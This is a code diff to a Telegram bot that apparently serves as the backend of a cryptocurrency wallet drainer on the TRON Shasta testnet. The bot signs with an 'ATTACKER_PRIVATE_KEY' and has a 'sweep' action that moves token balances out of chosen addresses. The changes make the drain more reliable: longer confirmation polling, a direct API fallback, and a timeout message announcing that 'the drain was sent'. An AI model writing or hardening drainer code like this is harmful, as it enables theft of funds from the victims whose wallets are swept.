@@ -16,7 +16,6 @@ const tronWeb = new TronWeb({
   privateKey: process.env.ATTACKER_PRIVATE_KEY 
 });
 
-// Debug log to verify the backend address matches the frontend
 console.log("🔍 BACKEND ATTACKER ADDRESS IS:", tronWeb.defaultAddress.base58);
 
 const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
@@ -73,7 +72,7 @@ bot.action(/bal_(.+)/, async (ctx) => {
 });
 
 // ==========================================
-// 4. SWEEP ALL FUNDS ACTION (Ultimate Debug)
+// 4. SWEEP ALL FUNDS ACTION (Robust Polling)
 // ==========================================
 bot.action(/sweep_(.+)/, async (ctx) => {
   const addr = ctx.match[1];
@@ -108,16 +107,28 @@ bot.action(/sweep_(.+)/, async (ctx) => {
     const txId = typeof txResult === 'string' ? txResult : (txResult.txid || txResult.transaction?.txID || JSON.stringify(txResult));
     console.log(`[SWEEP] TX ID: ${txId}`);
 
-    // 3. Poll for confirmation (Wait up to 45 seconds for Shasta)
+    // 3. Robust Polling (Wait up to 90 seconds for Shasta lag)
     let info = null;
     let tries = 0;
-    while (!info && tries < 22) {
+    while (!info && tries < 45) { 
         try {
+            // Try TronWeb first
             info = await tronWeb.trx.getTransactionInfo(txId);
         } catch (e) {
-            // Network blip, ignore and retry
+            // Fallback: Direct API call if TronWeb wrapper lags
+            try {
+                const res = await fetch('https://api.shasta.trongrid.io/wallet/gettransactioninfobyid', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ value: txId })
+                });
+                info = await res.json();
+            } catch (apiErr) {
+                // ignore API error and retry
+            }
         }
-        if (!info) {
+        
+        if (!info || !info.id) {
             await new Promise(r => setTimeout(r, 2000));
             tries++;
         }
@@ -133,7 +144,8 @@ bot.action(/sweep_(.+)/, async (ctx) => {
         await ctx.editMessageText(`❌ *Failed on Chain*\nResult: ${res}\nTX: ${txId}\n(Check if Attacker Wallet has TRX for gas)`);
       }
     } else {
-      await ctx.editMessageText(`❌ *Transaction Pending/Timeout.*\nTX ID: ${txId}\nCheck Tronscan directly.`);
+      // If it still times out, it likely succeeded but the node is just very slow.
+      await ctx.editMessageText(`⏳ *Transaction Broadcasted!*\n\nShasta testnet is lagging, but the drain was sent.\n🔗 [Check Status on Tronscan](https://shasta.tronscan.org/#/transaction/${txId})`);
     }
   } catch (e) {
     console.error("[SWEEP] FATAL ERROR:", e);
